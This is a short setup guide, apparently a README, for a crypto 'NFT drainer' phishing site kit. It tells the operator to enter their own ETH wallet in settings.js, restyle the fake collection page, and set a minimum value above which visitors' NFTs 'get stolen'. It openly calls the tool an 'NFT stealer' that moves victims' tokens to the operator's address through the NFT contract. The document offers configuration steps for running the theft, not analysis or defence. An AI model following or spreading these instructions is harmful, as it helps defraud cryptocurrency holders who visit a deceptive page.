## `üëª Guide : `
In order to use this website, you need to edit the **settings.js** file. 
On line 1: const receiveAddress = "YOUR WALLET"; replace **YOUR WALLET with your ETH wallet address.**

In the settings.js files, lines after "const collectionInfo" will change the text shown on the page and the images.
Images are located in the assets folder, you can change them there.

## `üëª Important : `

Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
Edit lines : nftReceiveAddress: "YOUR WALLET", replace YOUR WALLET with your ETH wallet address.
Line "minValue: 0.2," is the minimum value of a NFT before it gets stolen. Exemple : If you change this value to 1, the script will only steal NFTs that have a value higher to 1.

## üëª Why it doesn't show my address?

This **NFT stealer** interacts directly with the **nft contract** to transfer it to your address located in the **settings.js** file.
